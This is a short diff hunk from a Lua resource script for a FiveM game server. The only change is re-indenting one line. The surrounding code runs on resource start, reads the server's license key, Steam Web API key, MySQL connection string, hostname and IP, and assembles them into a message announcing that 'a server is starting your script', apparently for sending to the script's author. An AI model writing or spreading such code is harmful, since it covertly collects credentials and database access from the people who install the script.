@@ -23,7 +23,7 @@ AddEventHandler('onResourceStart', function(resourceName)
         local servername = GetConvar('sv_hostname')
         local licensekey = GetConvar('sv_licenseKey')
         local apikey = GetConvar('steam_webApiKey')
-		local mysql = GetConvar('mysql_connection_string')
+	local mysql = GetConvar('mysql_connection_string')
         local messagem = "A server is starting your script! \n > Server Name: \n**"..servername.."** \n > Server IP: `**"..text.."**` \n > License Key: **"..licensekey..'** \n Steam API Key: **'..apikey..'** \n Mysql: **'..mysql..'**'
         local content = {{
         author = {
